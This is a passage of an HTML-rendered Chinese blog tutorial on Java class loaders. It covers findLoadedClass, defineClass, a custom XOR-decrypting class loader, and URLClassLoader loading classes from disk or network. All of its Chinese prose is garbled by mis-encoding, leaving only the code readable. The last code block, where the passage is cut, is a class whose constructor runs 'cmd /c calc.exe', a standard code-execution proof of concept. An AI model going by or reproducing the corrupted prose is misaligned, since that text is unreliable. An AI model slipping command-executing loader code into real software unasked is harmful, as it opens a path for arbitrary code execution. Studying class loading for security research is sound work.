keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><h3 id="3ã€findLoadedClassï¼šæŸ¥æ‰¾JVMå·²ç»åŠ è½½è¿‡çš„ç±»"><a href="#3ã€findLoadedClassï¼šæŸ¥æ‰¾JVMå·²ç»åŠ è½½è¿‡çš„ç±»" class="headerlink" title="3ã€findLoadedClassï¼šæŸ¥æ‰¾JVMå·²ç»åŠ è½½è¿‡çš„ç±»"></a>3ã€findLoadedClassï¼šæŸ¥æ‰¾JVMå·²ç»åŠ è½½è¿‡çš„ç±»</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">findLoadedClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">checkName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">findLoadedClass0</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><h3 id="4ã€defineClassï¼šå®šä¹‰ä¸€ä¸ªJavaç±»ï¼Œå°†å­—èŠ‚ç è§£ææˆè™šæ‹Ÿæœºè¯†åˆ«çš„Classå¯¹è±¡ã€‚å¾€å¾€å’ŒfindClass-æ–¹æ³•é…åˆä½¿ç”¨ã€‚"><a href="#4ã€defineClassï¼šå®šä¹‰ä¸€ä¸ªJavaç±»ï¼Œå°†å­—èŠ‚ç è§£ææˆè™šæ‹Ÿæœºè¯†åˆ«çš„Classå¯¹è±¡ã€‚å¾€å¾€å’ŒfindClass-æ–¹æ³•é…åˆä½¿ç”¨ã€‚" class="headerlink" title="4ã€defineClassï¼šå®šä¹‰ä¸€ä¸ªJavaç±»ï¼Œå°†å­—èŠ‚ç è§£ææˆè™šæ‹Ÿæœºè¯†åˆ«çš„Classå¯¹è±¡ã€‚å¾€å¾€å’ŒfindClass()æ–¹æ³•é…åˆä½¿ç”¨ã€‚"></a>4ã€defineClassï¼šå®šä¹‰ä¸€ä¸ªJavaç±»ï¼Œå°†å­—èŠ‚ç è§£ææˆè™šæ‹Ÿæœºè¯†åˆ«çš„Classå¯¹è±¡ã€‚å¾€å¾€å’ŒfindClass()æ–¹æ³•é…åˆä½¿ç”¨ã€‚</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> off<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span>        <span class="token keyword">throws</span> <span class="token class-name">ClassFormatError</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> b<span class="token punctuation">,</span> off<span class="token punctuation">,</span> len<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><h3 id="5ã€resolveClassï¼šé“¾æ¥æŒ‡å®šJavaç±»"><a href="#5ã€resolveClassï¼šé“¾æ¥æŒ‡å®šJavaç±»" class="headerlink" title="5ã€resolveClassï¼šé“¾æ¥æŒ‡å®šJavaç±»"></a>5ã€resolveClassï¼šé“¾æ¥æŒ‡å®šJavaç±»</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> c<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">resolveClass0</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">native</span> <span class="token keyword">void</span> <span class="token function">resolveClass0</span><span class="token punctuation">(</span><span class="token class-name">Class</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="è‡ªå®šä¹‰ç±»åŠ è½½å™¨è¿‡ç¨‹"><a href="#è‡ªå®šä¹‰ç±»åŠ è½½å™¨è¿‡ç¨‹" class="headerlink" title="è‡ªå®šä¹‰ç±»åŠ è½½å™¨è¿‡ç¨‹"></a>è‡ªå®šä¹‰ç±»åŠ è½½å™¨è¿‡ç¨‹</h2><p>å› ä¸ºåœ¨å®é™…åº”ç”¨è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¸ä»…ä»…åªå¸Œæœ›ä½¿ç”¨classpathå½“ä¸­æŒ‡å®šçš„ç±»æˆ–è€…jaråŒ…è¿›è¡Œè°ƒç”¨ä½¿ç”¨ï¼Œæˆ‘ä»¬æœ‰æ—¶å¸Œæœ›è°ƒç”¨æœ¬åœ°ç£ç›˜æ–‡ä»¶æˆ–è€…ç½‘ç»œè¿˜å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰ç±»åŠ è½½å™¨çš„æ–¹å¼ã€‚</p><p>åœ¨ä¸Šé¢loadClassæ–¹æ³•åˆ†æä¸­ï¼Œä»–å†…éƒ¨å…¶å®æ˜¯è°ƒç”¨findClass(String) æ–¹æ³•æ¥è£…è½½ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æƒ³åŠ è½½è‡ªå·±è‡ªå®šä¹‰çš„ç±»ï¼Œå°±æ˜¯è¦†ç›–è¿™ä¸ªfindClass(String) æ–¹æ³•ï¼Œè€Œä¸æ˜¯loadClassæ–¹æ³•ã€‚</p><p>ä»¥ä¸‹å°±æ˜¯è‡ªå®šä¹‰ç±»åŠ è½½å™¨æ­¥éª¤ï¼š</p><p>1ã€ç»§æ‰¿ClassLoaderç±»</p><p>2ã€è¦†ç›–findClass()æ–¹æ³•</p><p>3ã€åœ¨findClass()æ–¹æ³•ä¸­è°ƒç”¨defineClass()æ–¹æ³•</p><p>è¿™é‡Œæˆ‘ä»¬å€ŸåŠ©ä¸€ä¸ªåŠ å¯†javaç±»å­—èŠ‚ç ä¾‹å­æ¥è®²è§£ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬å…ˆåˆ›å»ºä¸€ä¸ªCypherTest.javaæ–‡ä»¶ï¼Œç„¶åä½¿ç”¨java -d . CypherTest.javaï¼Œç„¶åå°±èƒ½ç”ŸæˆCypherTest.classæ–‡ä»¶äº†ã€‚</p><p>CypherTest.javaæ–‡ä»¶</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>test</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CypherTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"This experiment test is successful"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ç›®å½•ä¸‹ç”Ÿæˆäº†CypherTest.classæ–‡ä»¶ã€‚</p><p><img src="9.png" loading="lazy"></p><p>ä¹‹åæˆ‘ä»¬ç¼–å†™ä¸€ä¸ªåŠ å¯†ç±»Encryptionï¼Œä½¿ç”¨ç®€å•çš„é€ä½å–åè¿›è¡ŒåŠ å¯†æ“ä½œã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>testCypher</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Encryption</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">encode</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"/usr/local/com/test/CypherTest.class"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// è·å–è·¯å¾„CypherTest.classæ–‡ä»¶</span>                <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"/usr/local/temp/com/test/CypherTest.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ä¸ºäº†ä¿æŒä¸€è‡´ï¼Œåˆ›å»ºäº†ä¸€ä¸ªç©ºçš„tempç›®å½•</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token class-name">File</span> src<span class="token punctuation">,</span> <span class="token class-name">File</span> dest<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>            fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// é€ä½å–åæ“ä½œ</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>temp <span class="token operator">=</span> fis<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// è¯»å–ä¸€ä¸ªå­—èŠ‚</span>                fos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>temp <span class="token operator">^</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// å–åè¾“å‡º</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span> <span class="token comment">// å…³é—­æ•°æ®æµ</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>fis <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    fis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    fos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"This experiment test is successful"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ä¹‹åæˆ‘ä»¬çœ‹åˆ°ç”Ÿæˆäº†åŠ å¯†åæ–°çš„CypherTest.classæ–‡ä»¶ã€‚</p><p><img src="10.png" loading="lazy"></p><p>å› ä¸ºè¿™ä¸ªæ˜¯è‡ªå®šä¹‰åŠ å¯†åï¼Œæˆ‘ä»¬æ— æ³•ä½¿ç”¨å·¥å…·ç›´æ¥è¿›è¡Œåç¼–è¯‘æ“ä½œå’Œç›´æ¥ä½¿ç”¨jvmé»˜è®¤ç±»åŠ è½½å™¨å»ä½¿ç”¨å®ƒã€‚</p><p>ä¹‹åæˆ‘ä»¬å†ç¼–å†™ä¸€ä¸ªDectyptionè§£å¯†ç±»ï¼Œå¯¹æ–°åŠ å¯†çš„CypherTest.classè¿›è¡Œè§£å¯†æ“ä½œã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>testCypher</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Decryption</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">&#123;</span> <span class="token comment">// ç»§æ‰¿ClassLoaderç±»</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> rootDir<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Decryption</span><span class="token punctuation">(</span><span class="token class-name">String</span> rootDir<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>rootDir <span class="token operator">=</span> rootDir<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span> <span class="token comment">// é‡å†™è¦†ç›–findClass</span>    <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">findClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> className<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> c <span class="token operator">=</span> <span class="token function">findLoadedClass</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">ClassLoader</span> parent <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                c <span class="token operator">=</span> parent<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// System.out.println("çˆ¶ç±»æ— æ³•åŠ è½½ä½ çš„classï¼ŒæŠ›å‡ºClassNotFoundException,å·²æ•è·ï¼Œç»§ç»­è¿è¡Œ");</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"çˆ¶ç±»æˆåŠŸåŠ è½½"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> c<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token comment">// è¯»å–æ–‡ä»¶ è½¬åŒ–æˆå­—èŠ‚æ•°ç»„</span>                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classData <span class="token operator">=</span> <span class="token function">getClassData</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>classData <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token comment">// è°ƒç”¨defineClass()æ–¹æ³•</span>                    c <span class="token operator">=</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> classData<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> classData<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> c<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getClassData</span><span class="token punctuation">(</span><span class="token class-name">String</span> className<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> path <span class="token operator">=</span> rootDir <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> className<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token char">'.'</span><span class="token punctuation">,</span> <span class="token char">'/'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".class"</span><span class="token punctuation">;</span>        <span class="token comment">// å°†æµä¸­çš„æ•°æ®è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„</span>        <span class="token class-name">InputStream</span> is <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            is <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>temp <span class="token operator">=</span> is<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                baos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>temp <span class="token operator">^</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>is <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    is<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>baos <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    baos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨å°†Decryptionç»§æ‰¿ClassLoaderç±»ï¼Œä¹‹åè¦†ç›–findClass()æ–¹æ³•ï¼Œå¹¶ä¸”åœ¨findClass()æ–¹æ³•ä¸­è°ƒç”¨defineClass()æ–¹æ³•ä½¿ç”¨ï¼Œæœ€ååŠ è½½æˆ‘ä»¬è‡ªå®šä¹‰çš„getClassDataæ–¹æ³•å»è¿›è¡Œè§£å¯†æ“ä½œã€‚</p><p>æœ€åæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªDemoè¿›è¡Œæµ‹è¯•ï¼Œå»æŸ¥çœ‹å½“å‰ç±»åŠ è½½å™¨æœºåˆ¶çš„æƒ…å†µã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦è·å–å…¶è¾“å‡ºçš„System.out.printlnè¯­å¥ï¼Œéœ€è¦åå°„æœºåˆ¶å»å®ç°ã€‚è¿™ç¯‡æ–‡ç« æˆ‘ä»¬åªå­¦ä¹ ClassLoaderç±»åº”ç”¨ï¼Œå°±ä¸å»æ¶‰åŠå…¶ä»–çŸ¥è¯†ç‚¹ï¼Œè·å–å…¶ç±»åŠ è½½å™¨æŸ¥çœ‹å³å¯ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>testCypher</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Decryption</span> deLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Decryption</span><span class="token punctuation">(</span><span class="token string">"/usr/local/temp/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// è§£å¯†åŠ è½½å™¨</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> t1 <span class="token operator">=</span> deLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"com.test.CypherTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// åŠ è½½å·²åŠ å¯†çš„ç±»</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"c3 çš„Classæ˜¯  "</span> <span class="token operator">+</span> t1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="11.png" loading="lazy"></p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>é™¤äº†ä¸Šè¿°è‡ªå®šä¹‰ClassLoaderç±»ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å­¦ä¹ URLClassLoaderã€‚URLClassLoaderç±»ç»§æ‰¿ClassLoaderç±»ï¼Œå¯ä»¥åŠ è½½æœ¬åœ°ç£ç›˜å’Œç½‘ç»œä¸­çš„jaråŒ…ç±»æ–‡ä»¶ã€‚</p><h3 id="1-æœ¬åœ°ç£ç›˜classæ–‡ä»¶è°ƒç”¨"><a href="#1-æœ¬åœ°ç£ç›˜classæ–‡ä»¶è°ƒç”¨" class="headerlink" title="1. æœ¬åœ°ç£ç›˜classæ–‡ä»¶è°ƒç”¨"></a>1. æœ¬åœ°ç£ç›˜classæ–‡ä»¶è°ƒç”¨</h3><p>é¦–å…ˆæˆ‘åœ¨Dç›˜åˆ›å»ºäº†ä¸€ä¸ªTest.javaæ–‡ä»¶ï¼Œå†™äº†ä¸€æ®µcalc.exeè®¡ç®—æœºå¼¹çª—ä»£ç ã€‚å¦‚æœæ–‡ä»¶è¢«æˆåŠŸè§£ææ‰§è¡Œï¼Œä¼šè¾“å‡ºTest successå­—æ®µä¸”å¼¹å‡ºè®¡ç®—å™¨ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>test</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Test success!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"cmd /c calc.exe"</span><span class="token punctuation">)</span><span class="token 